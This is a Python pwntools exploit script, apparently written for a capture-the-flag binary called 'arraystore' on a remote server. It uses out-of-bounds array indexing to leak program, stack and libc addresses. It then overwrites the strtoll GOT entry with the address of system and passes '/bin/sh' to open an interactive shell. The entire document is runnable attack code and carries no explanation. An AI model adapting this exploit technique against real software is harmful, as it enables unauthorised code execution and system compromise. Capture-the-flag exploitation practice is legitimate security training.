from pwn import *
context.binary=exe=ELF('./arraystore',checksec =False)
#p=process(exe.path)
p=remote('34.124.157.94',10546)
def GDB():
	gdb.attach(p,gdbscript='''
		b*main+153
		c
		''')
	input()
exe_leak=8
libcleak=3#0x23f1d4
stack_leak=16


def read(index):
	p.sendlineafter(b"Read/Write?: ",b"R")
	p.sendlineafter(b"Index: ",f"{index}".encode())
	p.recvuntil(b"Value: ")
	return p.recvline()[:-1]
def write(index,value):
	p.sendlineafter(b"Read/Write?: ",b"W")
	p.sendlineafter(b"Index: ",f"{index}".encode())
	p.sendlineafter(b'Value: ',f"{value}".encode())
#GDB()
count=0
for i in range(1,100):
	leak=int(read(i))
	if(leak & 0xff==0x90):
		count+=1
		if (count==2):
			index=i
			print(f'index:{i}')
			log.info('[+]leak at index:'+hex(leak))
			exe.address=leak-0x1090
			log.info('[+]exe base:'+hex(exe.address))
			break
stack=int(read(index+4))

log.info("stack leak:"+hex(stack))
rsp=stack-0x4e8
log.info('RSP:'+hex(rsp))


index_puts=-(rsp-exe.got['puts'])//8
print(index_puts)
leak=int(read(index_puts))
log.info("[+]libc leak:"+hex(leak))

libc_base=leak-0x80ed0
system =libc_base+0x50d60
strtoll_index=-(rsp-exe.got['strtoll'])//8
print(strtoll_index)
write(strtoll_index,system)

p.sendlineafter(b"Read/Write?: ",b"W")
p.sendlineafter(b"Index: ",b"/bin/sh\x00")

p.interactive()

